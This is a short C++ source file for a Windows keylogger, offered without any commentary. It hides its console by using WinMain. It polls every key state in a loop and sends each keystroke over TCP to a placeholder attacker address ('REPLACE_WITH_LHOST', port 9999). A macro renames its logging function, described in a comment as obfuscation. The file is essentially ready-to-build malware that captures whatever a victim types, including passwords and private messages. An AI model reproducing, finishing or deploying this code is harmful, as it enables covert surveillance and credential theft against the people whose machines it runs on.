#include <winsock2.h>
#include <windows.h>
#include <iostream>

// Obfuscated function names
#define OBFUSCATE_FNC_NAME(name) name##_fnc

void OBFUSCATE_FNC_NAME(LGKey)(int key, SOCKET sock) {
    char buffer[2];
    buffer[0] = (char)key;
    buffer[1] = '\0';

    send(sock, buffer, 1, 0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("REPLACE_WITH_LHOST");
    server.sin_port = htons(9999);  // Change to your desired port

    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                OBFUSCATE_FNC_NAME(LGKey)(key, sock);
            }
        }
        Sleep(10);
    }

    closesocket(sock);
    WSACleanup();

    return 0;
}
